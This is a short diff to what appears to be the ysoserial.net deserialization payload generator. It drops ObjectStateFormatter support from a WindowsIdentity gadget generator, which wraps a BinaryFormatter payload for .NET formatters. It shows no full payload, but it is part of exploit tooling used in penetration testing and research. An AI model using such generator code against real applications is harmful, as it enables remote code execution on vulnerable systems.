@@ -28,7 +28,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter", "ObjectStateFormatter" };
+            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
         }
 
         public override string Name()
@@ -58,8 +58,7 @@ namespace ysoserial.Generators
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase))
+                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
             {
                 var obj = new WindowsIdentityIdentityMarshal(b64encoded);
                 return Serialize(obj, formatter, inputArgs);
